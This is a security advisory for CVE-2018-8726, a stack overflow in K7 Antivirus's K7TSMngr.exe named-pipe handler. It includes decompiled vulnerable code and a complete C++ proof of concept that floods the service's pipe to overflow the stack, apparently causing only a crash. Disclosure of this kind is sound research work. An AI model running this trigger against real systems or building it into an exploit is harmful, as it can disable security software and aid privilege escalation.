# CVE-2018-8726

# Product / Component Affected

* **Product**: *K7 Antivirus Premium 16.0.0.0* 
* **Component**: *K7TSMngr.exe 16.0.0.70*
  * SHA256: E6655EBC79644E7DB6FC36B2D98DE88A9635F47B3ADF1D834FD357D5EA3E15A6

# K7TSMngr.exe Pipe Handler Background
*See description in [CVE-2018-8724](../CVE-2018-8724/readme.md)*

# Details
Following on from the background piece above regarding the Pipe, the handler for the function id 0x10033 has a vulnerability which can easily lead to a stack overflow. As there are stack cookies in place, it isn't possible to simply overwrite the return pointer without some extra form of information disclosure.

When sending this function id in, it will ultimately call the function sub_409A60

```C++

typedef struct _unk_10033
{
    CHAR szMode[64];
    CHAR szKeyName[64];
    BOOL bDisableWarning;
    BOOL bDisableTimeOut;
} unk_10033;



BOOL __stdcall sub_409A60(int dwInSize, unk_10033 *pInput, int dwOutSize, int pOutput, int a5)
{
    // Ensure that the input buffer >= 0x88, note there is no upper limit on the length
    if ( (unsigned int)dwInSize < 0x88 )
        return 0;
    if ( _stricmp(pInput->szMode, "GamingMode") )
        // Make szMode be anything other than "GamingMode" (case-insensitive) to get in here...
        return sub_401A40((int)pInput->szKeyName, pInput->bDisableWarning, pInput->bDisableTimeOut) == 1;
    
    // ... other coee but redacted ...
}

int __cdecl sub_401A40(int pszSomething, BYTE DisableWarning, BYTE bDisableTimeOut)
{
    int v3; // ecx
    HKEY v4; // esi
    CHAR szKey[260]; // [esp+0h] [ebp-108h]

    if ( pszSomething && *(_BYTE *)pszSomething )
    {
        // VULN: pszSomething is provided to be and can be any length. szKey is only 260 characters
        // and butts right up against the stack cookie. 
        wsprintfA(szKey, "%s\\%s\\%s\\%s", "Software\\K7 Computing\\K7TotalSecurity", "Products", v3, pszSomething);
    }
    // ... removed rest of routine, not relavent ...
    return 1;
}

/*
Stack Layout from IDA:
-00000108
-00000108 szKey           db 260 dup(?)
-00000004 Cookie          dd ?
+00000000  r              db 4 dup(?)
*/
```

As can be seen from the code, the actual overflow is simple to tigger but it will not provide code execution without a bit more work. As there were other easier vulnerabilities I was getting LPE with, I didn't progress this much more than the demonstration of the overflow.

# PoC Code

```C++
#include <Windows.h>
#include <stdio.h>

// Pipe header structure to simply talk to the pipe
typedef struct _unk1
{
	DWORD dwMagic;
	DWORD dwControlCode;
	DWORD dwInSize;
	DWORD field_c;
	DWORD dwFunctionId;
	DWORD dwInputDataSize;
	DWORD dwOutputDataSize;
} unk1;

// Structure specific to the Function Id 10033. This is slightly different to the one in the 
// snippets above as we don't care about the other fields and simply want to send over a
// a huge packet to overflow the stack.
typedef struct _unk_10033
{
	CHAR szMode[64];
	CHAR szKeyNameAsFlood[0x10000];
} unk_10033;


int main(int argc, char** argv)
{
	HANDLE hPipe = CreateFileA("\\\\.\\pipe\\K7TSMngrService1", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hPipe == INVALID_HANDLE_VALUE)
	{
		printf("CreateFileW Failed: 0x%08x\r\n", GetLastError());
		return 0;
	}

    // Setup the connection
	unk1 u1 = { 0 };
	u1.dwMagic = 0x4B375453;
	u1.dwControlCode = 0x1010;
	u1.dwInSize = 28;
	u1.dwFunctionId = 0x10033;

	u1.dwInputDataSize = sizeof(unk_10033);
	u1.dwOutputDataSize = 0x100;

	DWORD dwBytesWritten = 0;
	if (!WriteFile(hPipe, &u1, sizeof(u1), &dwBytesWritten, NULL))
	{
		printf("WriteFile 1 Failed: 0x%08x\r\n", GetLastError());
		return 0;
	}

	// This will trigger the stack overflow
	unk_10033 u1033 = { 0 };
	memset(u1033.szMode, 0x41, sizeof(u1033.szMode));
	memset(u1033.szKeyNameAsFlood, 0x42, sizeof(u1033.szKeyNameAsFlood));

	if (!WriteFile(hPipe, &u1033, sizeof(u1033), &dwBytesWritten, NULL))
	{
		printf("WriteFile 2 Failed: 0x%08x\r\n", GetLastError());
		return 0;
	}
	

    return 1;
}


```